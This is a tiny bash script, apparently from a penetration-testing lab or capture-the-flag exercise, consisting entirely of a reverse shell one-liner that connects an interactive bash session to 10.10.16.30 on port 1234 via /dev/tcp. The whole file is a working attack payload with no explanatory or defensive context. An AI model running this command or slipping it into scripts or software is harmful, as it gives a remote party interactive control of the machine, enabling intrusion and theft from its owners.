#!/bin/bash
bash -i >& /dev/tcp/10.10.16.30/1234 0>&1
